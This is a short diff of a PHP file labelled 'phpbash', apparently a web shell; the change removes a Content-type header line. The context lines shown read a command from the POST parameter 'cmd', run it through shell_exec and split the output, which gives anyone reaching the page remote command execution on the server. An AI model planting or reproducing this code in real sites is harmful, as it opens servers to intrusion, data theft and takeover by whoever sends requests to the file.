@@ -1,5 +1,4 @@
 <?php
-header("Content-type: text/plain");
 /* phpbash by Alexander Reid (Arrexel) */
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
